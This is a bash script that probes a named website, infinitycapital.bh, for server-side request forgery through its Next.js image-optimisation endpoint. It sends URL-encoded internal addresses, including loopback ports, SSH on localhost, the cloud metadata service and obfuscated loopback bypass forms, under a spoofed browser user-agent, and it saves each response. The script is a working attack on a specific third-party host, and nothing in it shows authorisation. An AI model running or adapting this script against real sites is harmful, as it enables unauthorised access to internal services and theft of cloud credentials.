#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
cd "$WORK_PATH"
mkdir -p d11
i=0
while IFS= read -r target; do
  [ -z "$target" ] && continue
  i=$((i+1))
  e=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$target")
  out=$(curl -s -A "$UA" -o d11/ssrf$i.bin -D d11/ssrf$i.hdr -w "%{http_code}|%{size_download}|%{content_type}" --max-time 25 "$B/_next/image?url=$e&w=640&q=75")
  echo "SSRF$i $target -> $out"
done <<'EOF'
http://127.0.0.1:80/
http://127.0.0.1:3000/
http://localhost:22/
http://169.254.169.254/latest/meta-data/
http://[::1]:80/
http://0177.0.0.1/
http://127.1/
EOF
